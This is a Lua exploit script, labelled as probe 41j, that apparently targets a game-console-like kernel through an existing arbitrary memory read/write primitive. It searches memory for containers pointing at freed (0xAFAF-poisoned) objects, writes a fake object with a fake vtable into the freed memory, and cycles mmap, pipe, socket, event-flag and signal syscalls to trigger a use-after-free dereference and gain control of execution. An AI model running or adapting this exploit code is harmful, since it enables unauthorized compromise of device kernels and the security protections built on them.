-- CRASH_CLASS: RISKY (heap spray + UAF trigger)
-- PROBE 41j: exploit dangling pointers to freed targets
-- From 41i: 4 containers have target[0]=0xAFAFAFAF (freed)
-- Plan:
--   1. Find containers with freed targets (AFAF pattern)
--   2. Read the container's ptr at +08 to get the freed target address
--   3. Determine target object size from surrounding metadata
--   4. Spray: allocate many objects of similar size hoping to land on freed addr
--   5. Write controlled data at the freed address if we can reach it
--   6. Try to trigger the container to dereference the target
--      (via close/dup/ioctl-like syscalls)
--   7. Observe: crash = we control PC, no crash = need different trigger

print("=== PROBE 41j: UAF SPRAY ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function full_addr(hi, lo)
    return hi * 0x100000000 + lo
end

local base = do_mmap(PAGE)
if not base then print("mmap FAILED"); return end
print("anchor: " .. hex(base))
print("")

--------------------------------------------------------------------
-- STEP 1: Find containers pointing to freed targets
--------------------------------------------------------------------
print("--- STEP 1: FIND DANGLING CONTAINERS ---")

local dangling = {}
for i = 1, 384 do
    local pg = base - i * 0x1000
    if pg <= 0 then break end
    local v = safe_rd(pg)
    if v == nil then break end
    if v ~= 0 then
        for off = 0, 0xF00, 0x40 do
            if #dangling >= 8 then break end
            local a = pg + off
            local q0 = safe_rq(a)
            local q1 = safe_rq(a + 8)
            if q0 and q1 then
                local h0, l0 = get_hi_lo(q0)
                local h1, l1 = get_hi_lo(q1)
                -- rc=4, heap ptr
                if h0 == 0 and l0 == 4 and h1 == 3 and l1 >= 0x10000000 then
                    local tgt_addr = full_addr(h1, l1)
                    local tgt_q0 = safe_rq(uint64(tgt_addr))
                    if tgt_q0 then
                        local th, tl = get_hi_lo(tgt_q0)
                        if th == 0xAFAFAFAF and tl == 0xAFAFAFAF then
                            -- freed target! dump the container
                            local tag_q = safe_rq(a + 0x18)
                            local tag = 0
                            if tag_q then
                                local _, tl2 = get_hi_lo(tag_q)
                                tag = tl2
                            end
                            dangling[#dangling + 1] = {
                                container = a,
                                target = tgt_addr,
                                tag = tag,
                            }
                        end
                    end
                end
            end
        end
    end
    if #dangling >= 8 then break end
end

print("dangling containers: " .. #dangling)
for j, d in ipairs(dangling) do
    print(string.format("  #%d container=%s target=%s tag=0x%X",
        j, hex(d.container), hex(d.target), d.tag))
end
print("")

if #dangling == 0 then
    print("no dangling targets found this run")
    pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
    print("=== PROBE 41j COMPLETE ===")
    return
end

--------------------------------------------------------------------
-- STEP 2: Characterize the freed target region
--------------------------------------------------------------------
print("--- STEP 2: FREED TARGET REGION ---")
local victim = dangling[1]
local tgt = victim.target

-- how much of the freed region is 0xAFAF?
local afaf_extent = 0
for off = 0, 0x1F0, 8 do
    local q = safe_rq(uint64(tgt + off))
    if q then
        local h, l = get_hi_lo(q)
        if h == 0xAFAFAFAF or l == 0xAFAFAFAF then
            afaf_extent = off + 8
        else
            break
        end
    else
        break
    end
end
print("  freed extent: " .. hex(afaf_extent) .. " bytes of 0xAFAF")

-- check what's just before and after the freed region
local before_q = safe_rq(uint64(tgt - 8))
if before_q then
    print("  [-08]: " .. dump_qword(before_q) .. " (alloc header?)")
end
local after_q = safe_rq(uint64(tgt + afaf_extent))
if after_q then
    print("  [+" .. string.format("%02X", afaf_extent) .. "]: " .. dump_qword(after_q) .. " (next obj?)")
end
print("")

--------------------------------------------------------------------
-- STEP 3: Direct write to freed target
-- We proved adjacent write works — can we write to this specific addr?
--------------------------------------------------------------------
print("--- STEP 3: DIRECT WRITE TEST ---")

-- save original first qword
local orig_first = safe_rq(uint64(tgt))
print("  target[0] before: " .. (orig_first and dump_qword(orig_first) or "UNREADABLE"))

-- try direct write
local ok_w1 = safe_wd(tgt, 0x41414141)
local ok_w2 = safe_wd(tgt + 4, 0x42424242)
local after_first = safe_rq(uint64(tgt))
print("  write result: w1=" .. tostring(ok_w1) .. " w2=" .. tostring(ok_w2))
print("  target[0] after: " .. (after_first and dump_qword(after_first) or "UNREADABLE"))

local write_works = false
if after_first then
    local ah, al = get_hi_lo(after_first)
    if al == 0x41414141 and ah == 0x42424242 then
        print("  *** DIRECT WRITE TO FREED TARGET CONFIRMED ***")
        write_works = true
    end
end

if not write_works then
    -- restore
    if orig_first then
        local oh, ol = get_hi_lo(orig_first)
        safe_wd(tgt, ol)
        safe_wd(tgt + 4, oh)
    end
    print("  direct write failed, restored original")
    print("")
    pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
    print("=== PROBE 41j COMPLETE ===")
    return
end
print("")

--------------------------------------------------------------------
-- STEP 4: Write a fake object at the freed target
-- Make it look like a safe object that will survive dereference
-- Mirror the structure of a live target from 41i
--------------------------------------------------------------------
print("--- STEP 4: WRITE FAKE OBJECT ---")

-- From 41i deep dump, a live target object at 0x31087B000 had:
--   +00: 00000001_42621948  (vtable-like)
--   +08: F1AFAFAF_00000008
--   +10: 00000000_00000040
--   +18: 00000000_00000060
--   +20: 40080000_00000000  (capability mask?)
-- We'll write a distinctive pattern that:
-- a) Is recognizable if we see it in a crash
-- b) Has valid-looking pointers that point back to our controlled region
-- c) Uses our anchor page as a "vtable" so if it's called we control execution

-- Write marker pattern across the freed object
local marker_values = {
    {lo = 0xDEAD0001, hi = 0xFACE0001},  -- +00: fake vtable (recognizable)
    {lo = 0x00000008, hi = 0x00000000},    -- +08: size-like
    {lo = 0x00000040, hi = 0x00000000},    -- +10: offset-like
    {lo = 0x00000060, hi = 0x00000000},    -- +18: offset-like
    {lo = 0x00000000, hi = 0x40080000},    -- +20: capability (match live obj)
    {lo = 0x00000003, hi = 0x00000003},    -- +28: match live pattern
    {lo = 0xDEAD0030, hi = 0xFACE0030},  -- +30: marker
    {lo = 0x00000004, hi = 0x00000000},    -- +38: match live
}

for idx, mv in ipairs(marker_values) do
    local off = (idx - 1) * 8
    safe_wd(tgt + off, mv.lo)
    safe_wd(tgt + off + 4, mv.hi)
end

-- verify
print("  fake object written, verifying:")
for off = 0, 0x38, 8 do
    local q = safe_rq(uint64(tgt + off))
    if q then
        print(string.format("    [+%02X] %s", off, dump_qword(q)))
    end
end
print("")

--------------------------------------------------------------------
-- STEP 5: Also read the container to understand what field it reads
--------------------------------------------------------------------
print("--- STEP 5: CONTAINER CONTEXT ---")
print("  container at " .. hex(victim.container) .. ":")
for off = 0, 0x58, 8 do
    local q = safe_rq(victim.container + off)
    if q then
        local tag = ""
        if off == 0 then tag = " rc" end
        if off == 8 then tag = " ptr->freed_target" end
        if off == 0x18 then tag = " tag" end
        print(string.format("    [+%02X] %s%s", off, dump_qword(q), tag))
    end
end
print("")

--------------------------------------------------------------------
-- STEP 6: Try to trigger use of the container/target
-- Syscalls that might iterate or close kernel objects
--------------------------------------------------------------------
print("--- STEP 6: TRIGGER ATTEMPTS ---")

-- Read target[0] before each trigger to detect changes
local function check_target()
    local q = safe_rq(uint64(tgt))
    if q then return dump_qword(q) end
    return "FAULT"
end

print("  baseline: " .. check_target())

-- 6a: mmap churn (might trigger vm object cleanup)
for i = 1, 16 do
    local a = do_mmap(PAGE)
    if a then pcall(function() sc_munmap(uint64(a), uint64(PAGE)) end) end
end
print("  after mmap churn: " .. check_target())

-- 6b: pipe create+close (fd table activity)
local sys_pipe = make_syscall(42)
local sys_close = make_syscall(6)
for i = 1, 8 do
    local pb = memory.alloc(16)
    local ok_p = pcall(function() sys_pipe(pb) end)
    if ok_p then
        local f0 = safe_rd(pb)
        local f1 = safe_rd(pb + 4)
        if f0 and f0 > 0 then pcall(function() sys_close(f0) end) end
        if f1 and f1 > 0 then pcall(function() sys_close(f1) end) end
    end
end
print("  after pipe churn: " .. check_target())

-- 6c: socket create+close
local sys_socket = make_syscall(97)
for i = 1, 8 do
    local ok_s, fd = pcall(function() return sys_socket(2, 1, 0) end)
    if ok_s then
        local fdn = to_num(fd)
        if fdn > 0 then pcall(function() sys_close(fdn) end) end
    end
end
print("  after socket churn: " .. check_target())

-- 6d: EVF create+delete
local sys_evf_create = make_syscall(538)
local sys_evf_delete = make_syscall(539)
local nb = memory.alloc(32)
memory.write_byte(nb, 0x75) -- u
memory.write_byte(nb + 1, 0x61) -- a
memory.write_byte(nb + 2, 0x66) -- f
memory.write_byte(nb + 3, 0)
for i = 1, 4 do
    local ok_e, re = pcall(function() return sys_evf_create(nb, 0x11, memory.alloc(8)) end)
    if ok_e then
        local eid = to_num(re)
        if eid > 0 and eid < 100000 then
            pcall(function() sys_evf_delete(eid) end)
        end
    end
end
print("  after EVF churn: " .. check_target())

-- 6e: munmap our anchor itself (triggers vm cleanup)
-- But first record state
local pre_unmap = check_target()
pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
-- re-map to continue
local base2 = do_mmap(PAGE)
-- can we still read the target?
local post_unmap = check_target()
print("  after anchor unmap/remap: " .. post_unmap)
if pre_unmap ~= post_unmap then
    print("  *** TARGET CHANGED AFTER UNMAP ***")
end

-- 6f: try dynlib-related syscalls that might walk object lists
local sys_get_list = make_syscall(592)
local hb = memory.alloc(1024)
local nb2 = memory.alloc(8)
pcall(function() sys_get_list(hb, 128, nb2) end)
print("  after dynlib walk: " .. check_target())

-- 6g: try signal-related (might walk process structures)
local sys_sigaction = make_syscall(416)
local sa_buf = memory.alloc(64)
for sig = 1, 4 do
    pcall(function() sys_sigaction(sig, uint64(0), sa_buf) end)
end
print("  after sigaction: " .. check_target())

print("")

--------------------------------------------------------------------
-- STEP 7: Final state
--------------------------------------------------------------------
print("--- STEP 7: FINAL STATE ---")
print("  target object:")
for off = 0, 0x38, 8 do
    local q = safe_rq(uint64(tgt + off))
    if q then
        print(string.format("    [+%02X] %s", off, dump_qword(q)))
    else
        print(string.format("    [+%02X] FAULT (page freed!)", off))
    end
end

-- restore original freed pattern to avoid permanent corruption
print("  restoring 0xAFAF pattern...")
for off = 0, afaf_extent - 1, 4 do
    safe_wd(tgt + off, 0xAFAFAFAF)
end
print("  restored")

print("")
if base2 then pcall(function() sc_munmap(uint64(base2), uint64(PAGE)) end) end
print("=== PROBE 41j COMPLETE ===")
